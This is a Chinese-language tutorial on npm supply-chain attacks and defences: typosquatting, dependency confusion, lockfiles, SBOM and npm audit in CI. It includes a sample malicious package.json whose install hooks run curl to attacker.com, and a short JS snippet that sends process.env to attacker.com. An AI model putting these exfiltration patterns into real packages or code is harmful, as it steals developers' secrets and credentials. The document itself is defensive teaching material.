## 概述

供应链攻击（Supply Chain Attack）不直接攻击你的代码，而是攻击你依赖的第三方包。一个恶意包被安装进项目，就等于把攻击者的代码带进了生产环境。

```text
供应链攻击的威胁：
1. 依赖数量巨大 —— 一个项目动辄几百上千个依赖
2. 信任传递 —— 你信任的包可能依赖不信任的包
3. 安装即执行 —— npm 脚本可在安装时运行任意代码
4. 影响面广 —— 一个恶意包能波及成千上万下游项目
```

```text
著名案例：
1. event-stream —— 维护者转手后注入窃取加密货币的代码
2. left-pad —— 作者删包导致全球构建崩溃
3. ua-parser-js —— 被劫持发布恶意版本
4. node-ipc —— 作者注入抗议代码删除文件
```

```js
// 依赖的脆弱性：一行 require 背后是无数传递依赖
import express from 'express';
import lodash from 'lodash';
// 这两个包各自又有几十上百个传递依赖
```

## npm 依赖攻击

npm 依赖攻击（Dependency Attack）是供应链攻击的总称，攻击者通过污染 npm 生态里的包，让受害者安装时中招。

```text
npm 依赖攻击的常见手法：
1. 发布恶意包 —— 直接发布含后门的包
2. 劫持维护权 —— 窃取账号后给正常包发恶意版本
3. 污染传递依赖 —— 攻击上游，波及下游
4. 利用安装脚本 —— package.json 的 postinstall 执行恶意代码
```

```json
// 恶意包的 package.json：利用安装脚本执行代码
{
  "name": "innocent-looking-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node steal.js",
    "preinstall": "curl https://attacker.com/exfiltrate"
  }
}
```

```text
安装脚本是重灾区：
1. preinstall / postinstall —— 安装前后自动执行
2. 能访问环境变量、文件系统、网络
3. 很多合法包也用它，难以一刀切禁用
4. 可通过 npm config 或 ignore-scripts 关闭
```

## Typosquatting

Typosquatting（拼写仿冒）是攻击者发布与热门包名字极其相似的包，等开发者手滑装错。

```text
仿冒套路：
1. 字母互换 —— lodash → lodahs、react → raect
2. 加/减字符 —— axios → axioss、moment → momet
3. 替换相似字符 —— 0 和 O、l 和 1
4. 连字符/下划线 —— cross-env → cross_env
```

```text
真实案例：
1. colors → colorss
2. node-sass → node-saas
3. eslint → eslinnt
开发者输入错一个字母，就装进恶意包。
```

```bash
# 检查是否有可疑依赖
npm ls --depth=0
# 核对依赖名拼写是否与官方一致
```

```text
防护：
1. 安装前核对包名拼写
2. 关注包的下载量、发布时间、维护状态
3. 使用 package-lock.json 锁定确切版本
4. 企业私服做包名白名单/黑名单
```

## Dependency Confusion

Dependency Confusion（依赖混淆）利用包管理器的解析顺序，用公网同名恶意包「顶替」私有内部包。

```text
攻击原理：
1. 公司有私有包 @company/internal-lib（只在内网私服）
2. 攻击者在公网 npm 发布同名 @company/internal-lib
3. 解析依赖时，若公网包版本号更高，可能被优先拉取
4. 恶意包进入构建，窃取内网代码或密钥
```

```json
// package.json 引用了私有包
{
  "dependencies": {
    "@company/internal-lib": "^1.0.0"
  }
}
```

```text
防护：
1. 私有包用 scope 命名（@company/），并注册保护
2. 私服配置 scoped registry，强制走内网源
3. 用 .npmrc 明确 scope 的 registry 地址
4. 锁文件 + 依赖审计，发现异常来源
```

```ini
# .npmrc 配置：私有 scope 强制走内网私服
@company:registry=https://npm.company.com/
```

## Malicious Package

恶意包（Malicious Package）是明确携带后门的包，可能是全新发布，也可能是正常包被劫持后注入的版本。

```text
恶意包的典型行为：
1. 窃取环境变量 —— 读 .env、AWS key、CI 凭据
2. 上传源码 —— 把项目代码打包发到攻击者服务器
3. 挖矿 —— 占用 CPU 挖加密货币
4. 反向 shell —— 建立远程控制通道
```

```js
// 恶意包代码示例（简化）：窃取环境变量
const https = require('https');
const payload = JSON.stringify(process.env);
https.get(`https://attacker.com/collect?data=${encodeURIComponent(payload)}`);
```

```text
识别可疑包：
1. 名称陌生但功能「齐全」
2. 代码混淆、动态执行（eval、Function）
3. 有异常的网络请求、文件读写
4. 版本更新突然、维护者变更
```

```bash
# 检查依赖是否有异常安装脚本
npm ls --json | grep -A2 "scripts"
# 审查 node_modules 里的可疑代码
```

## Lockfile

Lockfile（锁文件，package-lock.json / yarn.lock / pnpm-lock.yaml）记录依赖的精确版本和来源，是供应链安全的第一道防线。

```text
Lockfile 的价值：
1. 锁定精确版本 —— 保证所有人装到一模一样的依赖
2. 记录完整性哈希 —— integrity 字段校验包内容
3. 记录来源 URL —— resolved 字段标明从哪下载
4. 可复现构建 —— 避免「我本地好好的」问题
```

```json
// package-lock.json 片段
{
  "node_modules/lodash": {
    "version": "4.17.21",
    "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
    "integrity": "sha512-..."
  }
}
```

```bash
# 生成锁文件
npm install --package-lock-only
# 提交到 git，保证团队一致
git add package-lock.json
```

```text
Lockfile 要点：
1. 必须提交到版本库，别加进 .gitignore
2. integrity 哈希能防篡改（包内容被改会被发现）
3. npm ci 严格按锁文件安装，不用 npm install 的宽松解析
```

## SBOM

SBOM（Software Bill of Materials，软件物料清单）是依赖的完整清单，记录每个组件的版本、来源、许可，用于追溯和审计。

```text
SBOM 包含什么：
1. 所有直接和传递依赖的清单
2. 每个组件的版本、供应商、许可协议
3. 组件之间的依赖关系
4. 漏洞关联信息（配合 CVE 数据库）
```

```bash
# 生成 SBOM（Node.js 生态常用工具）
# 用 CycloneDX
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# 用 Syft
syft . -o cyclonedx-json > sbom.json
```

```text
SBOM 的标准格式：
1. CycloneDX —— OWASP 标准，JSON/XML
2. SPDX —— Linux 基金会标准
3. 两者都记录组件版本、来源、关系
```

```text
SBOM 的价值：
1. 漏洞响应 —— 某 CVE 爆发时，快速定位是否受影响
2. 合规审计 —— 满足安全合规要求
3. 许可证管理 —— 避免引入不合规的许可
```

## Dependency Audit

Dependency Audit（依赖审计）是用工具扫描依赖树，找出已知漏洞（CVE），是持续性的安全检测手段。

```bash
# npm 内置审计
npm audit

# 输出详细报告，包含漏洞等级和修复建议
npm audit --json
```

```bash
# 尝试自动修复
npm audit fix

# 查看修复后的剩余问题
npm audit
```

```text
审计输出示例：
lodash  <=4.17.20  原型污染漏洞  严重  可通过 npm audit fix 修复
```

```bash
# 更全面的工具：osv-scanner、Snyk、Dependabot
# Snyk 扫描
npx snyk test

# GitHub Dependabot 自动开 PR 更新有漏洞的依赖
```

```text
审计要点：
1. 集成到 CI —— 每次构建都跑 npm audit
2. 关注高危/严重级别 —— 中低危按优先级排期
3. npm audit fix 可能引入 breaking change，要测试
4. 传递依赖的漏洞也要关注，可能无法直接修
```

## 应用场景实战

### 场景一：CI 集成的依赖安全门禁

```bash
# 在 CI 里加依赖审计，有高危漏洞就阻断发布
npm ci                    # 严格按锁文件安装
npm audit --audit-level=high   # 高危即失败
if [ $? -ne 0 ]; then
  echo "依赖存在高危漏洞，阻断发布"
  exit 1
fi
npm run build
```

### 场景二：私有 scope 防依赖混淆

```ini
# .npmrc 强制私有包走内网私服
registry=https://registry.npmjs.org/
@company:registry=https://npm.company.internal/

# 同时保证锁文件记录了正确的 resolved 来源
```

```bash
# 验证依赖来源
npm ls --json | grep resolved
# 确认 @company/* 的 resolved 都指向内网私服
```

## 最佳实践与踩坑记录

### 最佳实践

1. 提交锁文件，用 npm ci 严格安装，保证可复现
2. 私有包用 scope + scoped registry，防依赖混淆
3. 集成依赖审计到 CI，高危漏洞阻断发布
4. 定期生成 SBOM，建立漏洞响应能力
5. 审查安装脚本，必要时 ignore-scripts 关闭

### 踩坑记录

```text
坑 1：锁文件加进 .gitignore
结论：团队各装各的版本，出现「我本地正常」。
原因：没有锁文件，npm install 每次解析可能不同。
解法：package-lock.json 必须提交，安装用 npm ci。

坑 2：npm audit fix 直接跑
结论：自动升级引入 breaking change，功能崩了。
原因：audit fix 可能跨大版本升级依赖。
解法：先看报告，逐项评估，升级后跑完整测试。

坑 3：忽略传递依赖的漏洞
结论：直接依赖干净，但传递依赖有高危漏洞。
原因：只审计了顶层依赖。
解法：npm audit 默认扫描整棵树，别只看直接依赖。

坑 4：私服没配置 scope registry
结论：私有包被公网同名包顶替。
原因：依赖混淆攻击，公网包版本号更高被优先拉取。
解法：.npmrc 配置 scope 强制走内网，锁文件核对 resolved。

坑 5：安装脚本未审查
结论：恶意包 postinstall 窃取了环境变量。
原因：npm 默认执行安装脚本。
解法：ignore-scripts=true 或审查依赖的 scripts 字段。
```
